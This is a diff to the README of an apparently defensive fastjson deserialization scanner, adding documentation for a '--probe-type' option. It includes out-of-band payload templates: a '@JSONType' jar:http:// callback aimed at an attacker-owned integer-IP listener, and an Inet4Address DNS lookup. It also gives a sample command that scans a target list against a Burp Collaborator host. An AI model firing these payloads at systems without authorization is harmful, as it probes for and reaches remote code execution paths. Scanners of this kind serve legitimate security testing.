@@ -54,6 +54,23 @@ callbacks map back to the exact domain. Requests are sent **concurrently** — t
 `--threads N` (default 20). Exit 2 if any target calls back. `fjscan_static.py` is likewise
 parallel (`--threads N`, default 8) for large artifact trees.
 
+**`--probe-type` — which OOB primitive to send (important for Burp Collaborator):**
+
+| value | payload | fires a **dotted** Collaborator? | proves |
+|---|---|---|---|
+| `jsontype` (default) | `@JSONType` `jar:http://<int-ip>…` | **no** — dots→slashes forces an int-IP host, so a public Collaborator can't attribute it; use a raw-IP listener you own | the RCE path is reachable |
+| `dns` | `{"@type":"java.net.Inet4Address","val":"<tok>.<collab>"}` | **yes** — accepts a dotted host, works with autoType off | fastjson present + processes `@type` + host has egress (prerequisite) |
+| `both` | sends each | — | — |
+
+```
+# Confirm fastjson + egress against a Burp Collaborator subdomain:
+python3 fjscan_probe.py --collaborator <sub>.oastify.com --probe-type dns --targets domains.txt
+```
+Watch your Collaborator for **`<tok>.<sub>.oastify.com`** DNS/HTTP interactions — the `<tok>`
+prefix encodes which target called back. For the RCE-path (`jsontype`) callback you need an OOB
+listener addressable by a **raw IPv4** (encoded as an integer), since a dotted Collaborator host
+cannot survive the sink.
+
 **Bulk payloads for manual Burp testing** — `fjpayload.py --targets-file` emits one payload per
 domain with a stable per-target token (`fj<sha1>`):
 ```
